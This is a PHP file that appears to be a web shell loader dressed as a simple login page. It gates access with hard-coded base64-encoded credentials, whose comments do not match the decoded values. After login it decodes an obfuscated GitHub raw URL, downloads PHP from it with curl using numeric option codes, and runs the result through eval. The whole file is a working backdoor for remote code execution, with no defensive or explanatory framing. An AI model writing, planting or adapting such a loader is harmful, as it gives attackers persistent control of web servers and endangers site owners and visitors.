





666<?php
session_start();

$encoded_user = 'bGFuY2Vsb3Q=';     // base64_encode('crowdead212')
$encoded_pass = 'UGVkYW5na2VhZGlsYW42OA=='; // base64_encode('$6ghsujGg652HbHhJkKH86&hsjj')

$username = base64_decode($encoded_user);
$password = base64_decode($encoded_pass);

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input_user = trim($_POST['username'] ?? '');
        $input_pass = trim($_POST['password'] ?? '');

        if ($input_user === $username && $input_pass === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <form method="POST">
            <label>Username: <input type="text" name="username" required></label><br><br>
            <label>Password: <input type="password" name="password" required></label><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
    exit;
}

$f = fn($x) => base64_decode($x);

$a = $f("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3p6dnZ6enNlcnZlcnp6dnZ6ei9zZXJ2aWNlc2VydmVyL3JlZnMvaGVhZHMvbWFpbi9zc3Rlc3QucGhw");

$b = curl_init($a);

curl_setopt_array($b, [
    19913 => true,
    52 => true,
    13 => 30,
    64 => true
]);

$c = curl_exec($b);
$d = curl_getinfo($b, CURLINFO_HTTP_CODE);

curl_close($b);

if (!is_string($c) || $d !== 200) {
    exit;
}

eval("?>" . $c);


?>




